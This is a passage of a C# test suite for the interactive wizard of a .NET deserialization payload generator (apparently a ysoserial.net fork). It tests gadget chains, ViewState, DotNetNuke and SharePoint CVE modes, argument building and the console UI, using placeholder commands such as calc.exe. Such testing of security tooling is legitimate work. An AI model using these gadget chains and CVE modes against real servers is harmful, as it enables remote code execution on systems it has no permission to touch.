            // inputs, so each variant declares its own. Variant 1 reads a file,
            // variant 2 runs a command.
            var xii = Gadget("XamlImageInfo");
            var vs = xii.Variants();
            AssertEqual(CommandInputType.FilePath, vs[0].EffectiveInput(xii.CommandInput()), "XamlImageInfo v1 = file path");
            AssertEqual(CommandInputType.ShellCommand, vs[1].EffectiveInput(xii.CommandInput()), "XamlImageInfo v2 = shell command");

            // A variant with no declared input falls back to the gadget default.
            var odp = Gadget("ObjectDataProvider");
            var ov = odp.Variants();
            AssertEqual(odp.CommandInput(), ov[0].EffectiveInput(odp.CommandInput()), "ODP variant inherits the gadget input");
            AssertTrue(!ov[0].Input.HasValue, "ODP variant declares no per-variant input");
        }

        private static void OptionHeuristics()
        {
            // Choices pulled from an enumerating description.
            var alg = EditableField.ParseChoices("The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.");
            AssertTrue(alg != null && alg.Count == 3, "three algorithms parsed");
            AssertEqual("DES", alg[0], "first choice");
            AssertEqual("AES", alg[2], "last choice");

            // Single-quoted tokens (delivery modes) become choices.
            var modes = EditableField.ParseChoices("'winforms' (default) or 'wpfxaml': two delivery modes");
            AssertTrue(modes != null && modes.Contains("winforms") && modes.Contains("wpfxaml"), "quoted modes parsed");

            // A default token is recovered.
            AssertEqual("AES", EditableField.ParseDefault("... can be DES, 3DES, or AES. Default: AES."), "default AES");
            AssertEqual("winforms", EditableField.ParseDefault("delivery mode. Default: winforms"), "default winforms");
            AssertEqual("", EditableField.ParseDefault("no default mentioned here"), "no default -> empty");

            // Required inference: value option with no default/ignored/optional.
            AssertTrue(EditableField.LooksRequired("The validationKey from machineKey.", true), "no-default value option looks required");
            AssertTrue(!EditableField.LooksRequired("Gadget chain. Default: ActivitySurrogateSelector.", true), "with-default is not required");
            AssertTrue(!EditableField.LooksRequired("A flag.", false), "flags are never required");
            AssertTrue(!EditableField.LooksRequired("Validate and decrypt the viewstate if it has been encrypted.", true), "conditional (if) is not required");
        }

        private static void EditorPluginFields()
        {
            // The editor turns a plugin's OptionSet into editable fields, recovering
            // defaults and choices, and offers a gadget picker for the gadget option.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("ViewState");

            EditableField gadget = FindEditable(fields, "gadget");
            AssertTrue(gadget != null && gadget.Kind == FieldKind.Pick, "gadget option is a picker");
            AssertTrue(gadget.Choices != null && gadget.Choices.Contains("TypeConfuseDelegate"), "gadget picker lists gadgets");
            AssertEqual("ActivitySurrogateSelector", gadget.Value, "gadget defaults to ActivitySurrogateSelector");

            EditableField valg = FindEditable(fields, "validationalg");
            AssertTrue(valg != null && valg.Kind == FieldKind.Choice, "validationalg is a choice");
            AssertTrue(valg.Choices.Contains("HMACSHA256"), "validationalg choices parsed from help");
            AssertTrue(valg.AllowCustom, "a choice still allows a custom value");

            EditableField vkey = FindEditable(fields, "validationkey");
            AssertTrue(vkey != null && vkey.Required, "validationkey is flagged required");

            // Output controls and a Generate action are always present.
            AssertTrue(FindEditable(fields, "output") != null, "output format field present");
            bool hasGenerate = false;
            foreach (EditableField f in fields)
                if (f.IsAction) hasGenerate = true;
            AssertTrue(hasGenerate, "a Generate action row is present");
        }

        private static EditableField FindEditable(List<EditableField> fields, string label)
        {
            foreach (EditableField f in fields)
                if (string.Equals(f.Label, label, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static EditableField FindAction(List<EditableField> fields, string actionId)
        {
            foreach (EditableField f in fields)
                if (f.IsAction && string.Equals(f.ActionId, actionId, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static void EditorActionsAndOwnership()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");

            // Generate, copy-to-clipboard, and show-command actions are all offered.
            AssertTrue(FindAction(fields, "generate") != null, "generate action present");
            AssertTrue(FindAction(fields, "clipboard") != null, "copy-to-clipboard action present");
            AssertTrue(FindAction(fields, "showcmd") != null, "show-command action present");

            // Built-ins are not module-own; the gadget's own options (e.g. variant) are.
            AssertTrue(!FindEditable(fields, "formatter").ModuleOwn, "formatter is a shared built-in");
            AssertTrue(!FindEditable(fields, "output").ModuleOwn, "output is a shared built-in");
            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null && variant.ModuleOwn, "variant is a gadget-specific option");
        }

        private static void ChoiceDetection()
        {
            // Colon-introduced list, keeping a dotted token intact (System.String).
            var fmt = EditableField.ParseChoices("The object format: Csv, PenData, System.String, WaveAudio. Default: PenData");
            AssertTrue(fmt != null && fmt.Count == 4, "colon list of four tokens");
            AssertTrue(fmt.Contains("System.String"), "dotted token kept whole");

            // Numbered options -> the numbers.
            var num = EditableField.ParseChoices("XAML variant: 1 = bare, 2 = wrapper. Default: 2");
            AssertTrue(num != null && num.Count == 2 && num[0] == "1" && num[1] == "2", "numbered choices 1,2");

            // Quoted lowercase modes, ignoring a quoted CamelCase format name.
            var mode = EditableField.ParseChoices("mode. 'winforms' (default) under the 'Xaml' format, or 'wpfxaml'. Default: winforms");
            AssertTrue(mode != null && mode.Count == 2, "two lowercase modes");
            AssertTrue(mode.Contains("winforms") && mode.Contains("wpfxaml") && !mode.Contains("Xaml"), "CamelCase 'Xaml' excluded");

            // And the real Clipboard plugin options come through as selects. Clipboard
            // declares modes, so 'mode' is the mode picker (two delivery modes) and the
            // inner xamlvariant is a choice shown in the wpfxaml mode.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("Clipboard");
            EditableField modeField = FindEditable(fields, "mode");
            AssertTrue(modeField != null && modeField.Kind == FieldKind.Choice, "Clipboard mode is a choice");
            AssertTrue(modeField.Choices.Count == 2, "two delivery modes offered");
            EditableField xv = FindEditable(fields, "xamlvariant");
            AssertTrue(xv != null && xv.Kind == FieldKind.Choice, "xamlvariant is a choice");
        }

        private static void BridgedChainChoices()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");
            EditableField bgc = FindEditable(fields, "bridgedgadgetchain");
            AssertTrue(bgc != null && bgc.Kind == FieldKind.Choice, "bridged chain is a choice");
            AssertTrue(bgc.AllowCustom, "still allows a custom comma-separated chain");
            AssertTrue(bgc.Choices != null && bgc.Choices.Count > 0, "offers bridge-capable gadgets");
        }

        private static void VariantSwitchResetsCommand()
        {
            // XamlImageInfo v1 reads a file path, v2 runs a shell command. A command
            // typed under the shell variant must NOT survive a switch to the file
            // variant (where it would silently be used as a file path).
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("XamlImageInfo");
            EditableField variant = FindEditable(fields, "variant");
            EditableField command = FindEditable(fields, "command");
            AssertTrue(variant != null && command != null, "variant and command fields present");
            // The variant field is bound to its labels, in variant order (v1, v2).
            AssertTrue(variant.Choices != null && variant.Choices.Count == 2, "two variant labels");
            string v1Label = variant.Choices[0]; // v1 = file path
            string v2Label = variant.Choices[1]; // v2 = shell command

            // Select the shell-command variant and set a command.
            variant.Value = v2Label;
            editor.RefreshDynamicForTest();
            command.Value = "whoami";
            editor.RefreshDynamicForTest(); // stable type: the value is kept
            AssertEqual("whoami", editor.CommandValueForTest, "command kept while type is unchanged");

            // Switch to the file-path variant: the stale shell command is cleared.
            variant.Value = v1Label;
            editor.RefreshDynamicForTest();
            AssertEqual("", editor.CommandValueForTest, "command reset when the input type changes");
        }

        private static void OptionsPersistAndReset()
        {
            // One session shared across module loads (this is what the real editor
            // uses to carry values between modules).
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, false, null, session);

            // Change a shared setting (outputpath) in one plugin, as an edit would.
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField op = FindEditable(vs, "outputpath");
            AssertTrue(op != null, "outputpath present");
            op.Value = "out.bin"; op.Touched = true;

            // Open a different plugin: the same setting pre-fills from memory.
            var dnn = editor.BuildFieldsForTest("DotNetNuke");
            AssertEqual("out.bin", FindEditable(dnn, "outputpath").Value,
                "a changed setting persists to another module that has it");

            // Reset restores this module's defaults (outputpath default is empty).
            editor.ResetToDefaultsForTest();
            AssertEqual("", FindEditable(editor.CurrentFieldsForTest, "outputpath").Value,
                "reset returns settings to their defaults");

            // Reset also drops the remembered value, so it no longer propagates.
            var vs2 = editor.BuildFieldsForTest("ViewState");
            AssertEqual("", FindEditable(vs2, "outputpath").Value,
                "reset cleared the remembered value too");

            // An untouched default must NOT propagate (no clobbering other defaults).
            var session2 = new WizardSession();
            var editor2 = new ModuleEditor(null, null, false, null, session2);
            editor2.BuildFieldsForTest("ViewState");                 // nothing touched
            var dnn2 = editor2.BuildFieldsForTest("DotNetNuke");
            AssertEqual("", FindEditable(dnn2, "outputpath").Value,
                "untouched defaults do not leak into other modules");
        }

        private static void CommandPersistsAcrossGadgets()
        {
            // Type a command in one gadget and switch to another WITHOUT generating:
            // the new gadget must show the typed command, not the old default. (The
            // bug: the command was only saved at generate time.)
            var session = new WizardSession();
            var editor = new ModuleEditor(null, null, true, null, session);

            var g1 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField cmd = FindEditable(g1, "command");
            AssertTrue(cmd != null, "command field present");
            cmd.Value = "mspaint"; cmd.Touched = true;

            // Switching modules snapshots the current one, then seeds the next.
            var g2 = editor.BuildFieldsForTest("ClaimsIdentity");
            AssertEqual("mspaint", FindEditable(g2, "command").Value,
                "the typed command carried to another gadget without generating");

            // And back again shows the same, not the stale default.
            var g3 = editor.BuildFieldsForTest("TypeConfuseDelegate");
            AssertEqual("mspaint", FindEditable(g3, "command").Value,
                "the typed command is still there when returning to the first gadget");
        }

        private static void SettingsSharedGadgetToPlugin()
        {
            // Two separate editors (gadget + plugin) that share one session, exactly
            // like the real wizard. A setting changed in the gadget carries to a
            // plugin that has the same-named setting.
            var session = new WizardSession();

            var gEditor = new ModuleEditor(null, null, true, null, session);
            var g = gEditor.BuildFieldsForTest("TypeConfuseDelegate");
            EditableField gop = FindEditable(g, "outputpath");
            gop.Value = "shared.bin"; gop.Touched = true;
            gEditor.SnapshotToMemoryForTest(); // simulates leaving the gadget editor

            var pEditor = new ModuleEditor(null, null, false, null, session);
            var p = pEditor.BuildFieldsForTest("ViewState");
            AssertEqual("shared.bin", FindEditable(p, "outputpath").Value,
                "a setting changed in a gadget carries to a plugin with the same setting");
        }

        private static void ViewStateModeErrorIsActionable()
        {
            // Only a validationkey, no payload source: generation must fail with a
            // message that names what to set (not the old vague "mode" text), and it
            // must NOT kill the process.
            RunResult r = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--validationkey=70DBADBFF4B7A13BE67DD0B11B177936" });
            AssertTrue(!r.Success, "fails without a payload source");
            string m = (r.ErrorMessage ?? "").ToLowerInvariant();
            AssertTrue(m.Contains("command") && m.Contains("dryrun") && m.Contains("unsignedpayload"),
                "the error names the payload-source options: " + r.ErrorMessage);

            // 'examples' must throw (caught) rather than exiting the process.
            RunResult ex = PayloadRunner.RunPlugin("ViewState",
                new string[] { "-p", "ViewState", "--examples" });
            AssertTrue(!ex.Success, "examples does not generate a payload");
            AssertTrue((ex.ErrorMessage ?? "").ToLowerInvariant().Contains("examples"),
                "examples reports a clear message instead of exiting: " + ex.ErrorMessage);
        }

        private static void ExamplesHiddenFromEditor()
        {
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "examples") == null,
                "the informational 'examples' toggle is not shown in the settings editor");
            // Real payload options are still present.
            AssertTrue(FindEditable(vs, "validationkey") != null, "validationkey still shown");
            AssertTrue(FindEditable(vs, "mode") != null, "the mode picker is shown");
        }

        private static void PluginModesDriveOptions()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");

            EditableField mode = FindEditable(vs, "mode");
            AssertTrue(mode != null && mode.Kind == FieldKind.Choice, "a mode picker is shown");
            AssertTrue(mode.Choices != null && mode.Choices.Count == 3, "three modes offered");

            // Default mode = Exploit: command + validationkey required, gadget shown,
            // the defining 'dryrun' flag hidden (implied by the mode).
            EditableField command = FindEditable(vs, "command");
            EditableField vkey = FindEditable(vs, "validationkey");
            AssertTrue(command.Required, "exploit: command is required");
            AssertTrue(vkey.Required, "exploit: validationkey is required");
            AssertTrue(!FindEditable(vs, "gadget").Hidden, "exploit: gadget is shown");
            // dryrun is the mode-defining flag: driven by the picker, not shown as a field.
            AssertTrue(FindEditable(vs, "dryrun") == null, "exploit: dryrun is not a separate field (mode-driven)");
            AssertTrue(FindEditable(vs, "unsignedpayload").Hidden, "exploit: unsignedpayload is hidden");

            command.Value = "calc.exe"; command.Touched = true;
            vkey.Value = "ABC"; vkey.Touched = true;
            string exploitArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(exploitArgv.Contains("--command") && exploitArgv.Contains("--validationkey"),
                "exploit argv passes command and validationkey: " + exploitArgv);
            AssertTrue(!exploitArgv.Contains("--dryrun"), "exploit argv has no --dryrun");
            AssertTrue(!exploitArgv.Contains("--unsignedpayload"), "exploit argv has no --unsignedpayload");

            // Switch to Dry run: only validationkey required; gadget/command hidden and
            // NOT passed; the --dryrun flag is passed instead.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(vs, "validationkey").Required, "dryrun: validationkey required");
            AssertTrue(FindEditable(vs, "command").Hidden, "dryrun: command hidden");
            AssertTrue(FindEditable(vs, "gadget").Hidden, "dryrun: gadget hidden");
            string dryArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(dryArgv.Contains("--dryrun"), "dryrun argv passes --dryrun: " + dryArgv);
            AssertTrue(!dryArgv.Contains("--command") && !dryArgv.Contains("--gadget"),
                "dryrun argv drops command and gadget: " + dryArgv);

            // A plugin without modes is unaffected: no mode picker.
            var at = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ApplicationTrust");
            AssertTrue(FindEditable(at, "mode") == null, "a plugin without modes shows no mode picker");
        }

        private static void DotNetNukeModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("DotNetNuke");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 3, "three DotNetNuke modes");

            // Default = run_command: command required; url/file hidden.
            AssertTrue(FindEditable(f, "command").Required, "run_command: command required");
            AssertTrue(FindEditable(f, "url").Hidden && FindEditable(f, "file").Hidden, "run_command: url/file hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode run_command") && a1.Contains("--command"), "run_command argv: " + a1);
            AssertTrue(!a1.Contains("--url") && !a1.Contains("--file"), "run_command argv excludes url/file");
            RunResult r1 = PayloadRunner.RunPlugin("DotNetNuke", editor.PluginArgvForTest().ToArray());
            AssertTrue(r1.Success, "run_command generates via CLI args: " + r1.ErrorMessage);

            // Switch to write_file: file+url required and shown; command hidden.
            mode.Value = mode.Choices[2];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(f, "file").Required && FindEditable(f, "url").Required, "write_file: file+url required");
            AssertTrue(FindEditable(f, "command").Hidden, "write_file: command hidden");
            FindEditable(f, "file").Value = "c:/temp/x.txt"; FindEditable(f, "file").Touched = true;
            FindEditable(f, "url").Value = "http://a/b"; FindEditable(f, "url").Touched = true;
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode write_file") && a2.Contains("--file") && a2.Contains("--url"), "write_file argv: " + a2);
            AssertTrue(!a2.Contains("--command"), "write_file argv excludes command");
        }

        private static void ClipboardModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("Clipboard");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 2, "two clipboard modes");

            // Default = winforms: format shown, xamlvariant hidden.
            AssertTrue(!FindEditable(f, "format").Hidden, "winforms: format shown");
            AssertTrue(FindEditable(f, "xamlvariant").Hidden, "winforms: xamlvariant hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode winforms"), "winforms argv has mode: " + a1);
            AssertTrue(!a1.Contains("--xamlvariant"), "winforms argv excludes xamlvariant");

            // Switch to wpfxaml: xamlvariant shown, format hidden and dropped.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "xamlvariant").Hidden, "wpfxaml: xamlvariant shown");
            AssertTrue(FindEditable(f, "format").Hidden, "wpfxaml: format hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode wpfxaml"), "wpfxaml argv has mode: " + a2);
            AssertTrue(!a2.Contains("--format"), "wpfxaml argv excludes format");
        }

        private static void SharePointModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("SharePoint");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 6, "six SharePoint CVE modes");
            // The CVE selector is the mode picker, not a duplicate 'cve' field.
            AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");

            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl hidden.
            AssertTrue(FindEditable(f, "command").Required, "command required");
            AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
            AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl"), "49704 argv excludes gadget/useurl");

            // Switch to CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
            mode.Value = mode.Choices[3];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
            AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--cve CVE-2020-1147") && a2.Contains("--gadget"), "1147 argv: " + a2);
            RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);

            // Switch to CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
            mode.Value = mode.Choices[5];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
            string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
            RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);
        }

        private static void BannerShowsBetaAndVersion()
        {
            var keys = new ScriptedKeyReader();
            keys.Escape(); // quit at the top menu after the banner is shown
            string stderr;
            DriveWizard(keys, out stderr);
            AssertTrue(stderr.ToLowerInvariant().Contains("beta"), "banner marks interactive mode as beta");
            string ver = Wizard.ProductVersion();
            AssertTrue(!string.IsNullOrEmpty(ver), "a product version is available");
            AssertTrue(stderr.Contains(ver), "banner shows the product version (" + ver + ")");
        }

        private static void ExplicitEmptyStringViaSpace()
        {
            // viewStateUserKey is the real case: ViewState checks it with != null, so
            // an empty string differs from unset. The space convention must let the
            // user express that and pass it as --viewstateuserkey "".
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField k = FindEditable(vs, "viewstateuserkey");
            AssertTrue(k != null, "viewstateuserkey field present");
            AssertTrue(string.IsNullOrEmpty(k.Value) && !k.ExplicitEmpty, "starts unset");

            // Unset is not passed on the command line.
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "unset viewstateuserkey is not passed");

            // One space -> an explicit empty string, shown distinctly and passed as "".
            ModuleEditor.CommitTextForTest(k, " ");
            AssertTrue(k.ExplicitEmpty && k.Value == "", "one space = explicit empty string");
            AssertEqual("(empty string)", k.DisplayValue, "explicit empty shows distinctly (not '(unset)')");
            string argv = string.Join("|", editor.PluginArgvForTest().ToArray());
            AssertTrue(argv.Contains("--viewstateuserkey|"), "explicit empty is passed as --viewstateuserkey \"\": " + argv);

            // Two spaces -> a single real space value; three -> two spaces.
            ModuleEditor.CommitTextForTest(k, "  ");
            AssertTrue(!k.ExplicitEmpty && k.Value == " ", "two spaces = one space value");
            ModuleEditor.CommitTextForTest(k, "   ");
            AssertTrue(!k.ExplicitEmpty && k.Value == "  ", "three spaces = two spaces");

            // Mixed input is taken literally: leading/trailing spaces are NOT trimmed.
            ModuleEditor.CommitTextForTest(k, " abc ");
            AssertTrue(k.Value == " abc " && !k.ExplicitEmpty, "surrounding spaces preserved (not trimmed)");

            // Truly empty input -> unset again (not passed).
            ModuleEditor.CommitTextForTest(k, "");
            AssertTrue(!k.ExplicitEmpty && string.IsNullOrEmpty(k.Value), "empty input -> unset");
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "back to unset is not passed");
        }

        private static void ConditionalRequired()
        {
            // ViewState: the genuinely-required key stays flagged; the conditional
            // ones (mode/encryption/OSF-specific, or optional) do not.
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "validationkey").Required, "validationkey is required");
            AssertTrue(!FindEditable(vs, "decryptionkey").Required, "decryptionkey is conditional (encryption)");
            AssertTrue(!FindEditable(vs, "mackey").Required, "mackey is conditional (osf)");
            AssertTrue(!FindEditable(vs, "path").Required, "path is optional");
            AssertTrue(!FindEditable(vs, "apppath").Required, "apppath is conditional");
            AssertTrue(!FindEditable(vs, "viewstateuserkey").Required, "viewstateuserkey is conditional (sometimes)");

            // Mode-conditional options in other plugins are not required either.
            var dnn = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("DotNetNuke");
            AssertTrue(!FindEditable(dnn, "file").Required, "DotNetNuke file is mode-conditional");
            AssertTrue(!FindEditable(dnn, "url").Required, "DotNetNuke url is mode-conditional");
        }

        private static void ThemeApply()
        {
            string original = ConsoleStyle.CurrentThemeName;
            try
            {
                AssertTrue(ConsoleStyle.Themes.Length >= 3, "several themes available");
                ConsoleStyle.ApplyTheme("Green");
                AssertEqual("Green", ConsoleStyle.CurrentThemeName, "current theme updated");
                AssertEqual(ConsoleColor.DarkCyan, ConsoleStyle.Accent, "Green theme sets its accent");
                ConsoleStyle.ApplyTheme("Blue");
                AssertEqual(ConsoleColor.Cyan, ConsoleStyle.Accent, "Blue theme sets its accent");
            }
            finally
            {
                ConsoleStyle.ApplyTheme(original);
            }
        }

        private static void WizardBlocksMissingRequired()
        {
            // ObjRef takes a URL (required) and has no default, so Generate with it
            // empty must be blocked with a message - and must NOT drop out of the
            // wizard (the following keys still drive it).
            var keys = new ScriptedKeyReader();
            keys.Enter();                  // top -> gadget
            keys.Type("ObjRef").Enter();   // module picker
            keys.Type("Generate").Enter(); // blocked: URL is required and empty
            keys.Escape();                 // leave form
            keys.Escape();                 // leave module list
            keys.Escape();                 // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "blocked generation emits no payload");
            AssertTrue(stderr.Contains("Not ready to generate"), "a clear not-ready report is shown");
            AssertTrue(stderr.Contains("command") && stderr.Contains("Example:"),
                "the report names the setting and shows an example");
            AssertTrue(stderr.Contains("Bye."), "the wizard is still running (reached the top-menu quit)");
        }

        private static void BlockedReportEnumeratesMissing()
        {
            // A plugin mode that requires several settings lists each missing one by
            // name, so the user fixes them all at once (ViewState 'Exploit' needs a
            // command and a validationkey).
            var ed = new ModuleEditor(null, null, false, null, null);
            ed.BuildFieldsForTest("ViewState");
            List<string> probs = ed.MissingRequiredModeProblemsForTest();
            AssertTrue(probs != null && probs.Count >= 2, "each missing required setting is enumerated");
            bool cmd = false, vk = false;
            foreach (string p in probs)
            {
                if (p.StartsWith("command")) cmd = true;
                if (p.StartsWith("validationkey")) vk = true;
                AssertTrue(p.Contains(":"), "each problem reads 'name: explanation' - " + p);
            }
            AssertTrue(cmd && vk, "both required ViewState settings are named: " + string.Join(" | ", probs.ToArray()));
        }

        private static void BlockedReportShowsCommandExample()
        {
            // A gadget whose -c is a URL (ObjRef) reports the expected input type and a
            // concrete example, not just "a value is missing".
            var ed = new ModuleEditor(null, null, true, null, null);
            ed.BuildFieldsForTest("ObjRef");
            string p = ed.MissingRequiredCommandProblemForTest();
            AssertTrue(p != null, "a missing required command is reported");
            AssertTrue(p.Contains("command") && p.Contains("URL") && p.Contains("Example:") && p.Contains("http"),
                "the command problem names the setting, its type, and a URL example: " + p);
        }

        private static void ColumnsHomeEndNav()
        {
            // End jumps to the last setting (the Reset action, always last).
            var end = DriveFrames(k => k.Enter().Enter().End().Escape().Escape().Escape());
            AssertTrue(AnyFrame(end, "> [ Reset settings to defaults ]"), "End jumps to the last setting");
        }

        private static void PickerHomeEnd()
        {
            // End selects the last match, Home the first (deterministic list).
            var items = new List<string> { "alpha", "bravo", "charlie", "delta" };
            string last = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Enter()).Show("pick", items, null));
            AssertEqual("delta", last, "End selects the last item");
            string first = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Home().Enter()).Show("pick", items, null));
            AssertEqual("alpha", first, "Home selects the first item");
        }

        private static void WizardGenerateAndQuit()
        {
            // Generate and quit emits the payload and leaves interactive mode; if it
            // did NOT exit, the wizard would ask for more keys and the scripted
            // reader would run dry (throwing), so reaching the asserts proves it left.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Generate and quit").Enter();  // generate + leave

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            AssertTrue(BytesEqual(got, GenerateOdpJson("calc.exe")), "the payload was emitted");
            AssertTrue(!stderr.Contains("Bye."), "left via generate-and-quit, not the plain quit");
        }

        private static void ColumnsRenderInVirtualTerminal()
        {
            // Drive the REAL side-by-side columns path (not the fallback) against an
            // in-memory terminal, and assert on what it actually renders. This is the
            // headless stand-in for a real console: it catches layout, column-hiding,
            // and per-cell-highlight regressions.
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false; // exercise RunColumns, not the fallback
            try
            {
                var keys = new RecordingKeyReader(vt);
                keys.Enter();       // top menu -> Build a gadget payload
                keys.Enter();       // columns: open the first gadget's settings
                keys.Down().Down(); // move the setting selection
                keys.Escape();      // back to the modules column
                keys.Escape();      // leave the editor -> top menu
                keys.Escape();      // quit

                new Wizard(keys, new MemoryStream()).Run();
                var frames = keys.Frames;
                AssertTrue(frames.Count >= 6, "a frame was captured per keypress");

                // Module-list frame: the settings/editor columns are hidden here; the
                // right side instead shows the highlighted gadget's info panel.
                Frame modules = FindFrame(frames, f => f.Contains("Gadgets") && f.Contains("- Info")
                    && f.Contains("Formatters:") && !f.Contains("[ Generate"));
                AssertTrue(modules != null, "module list shows the info panel, not the settings columns");

                // A three-column settings frame with the action rows.
                Frame settings = FindFrame(frames, f => f.Contains(" | ") && f.Contains("[ Generate and quit ]"));
                AssertTrue(settings != null, "three-column settings view rendered");
                AssertTrue(settings.Contains("command"), "command setting shown");
                AssertTrue(settings.Contains("formatter"), "formatter setting shown");
                AssertTrue(settings.Contains("[ Generate ]") && settings.Contains("[ Show ysonet command ]"), "all actions shown");

                // Per-cell highlight: the selection bar covers only the settings
                // column's current cell, not the whole row (the bug we fixed).
                int barRow = -1;
                for (int y = 0; y < settings.Height && barRow < 0; y++)
                    for (int x = 25; x < settings.Width; x++)
                        if (settings.Bg(x, y) == ConsoleStyle.SelectBg) { barRow = y; break; }
                AssertTrue(barRow >= 0, "a selection bar is drawn in the settings column");
                AssertTrue(settings.Bg(2, barRow) != ConsoleStyle.SelectBg,
                    "the modules column is NOT part of the settings selection bar (per-cell highlight)");
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static Frame FindFrame(List<Frame> frames, Func<Frame, bool> pred)
        {
            foreach (Frame f in frames)
                if (pred(f)) return f;
            return null;
        }

        private static void ColumnFilterNarrowsModules()
        {
            // On the gadget module list, typing "Windows" narrows it to the gadgets
            // whose name contains that substring. The active filter is tagged in the
            // header, and a matching gadget is shown.
            var frames = DriveFrames(k => k.Enter()              // build a gadget -> module list
                .Type("Windows")                                 // filter the modules
                .Escape().Escape().Escape());                    // clear filter, leave, quit
            AssertTrue(AnyFrame(frames, "/Windows"), "the active module filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "WindowsIdentity"), "a substring match is shown while filtering");

            // A filter that matches nothing produces a match-free list (no gadget rows),
            // but does not crash the redraw.
            var none = DriveFrames(k => k.Enter().Type("zznomatch").Escape().Escape().Escape());
            AssertTrue(AnyFrame(none, "/zznomatch"), "a no-match filter is still tagged");
        }

        private static void ColumnFilterNarrowsSettings()
        {
            // Inside a gadget's settings, typing "out" narrows the list to the settings
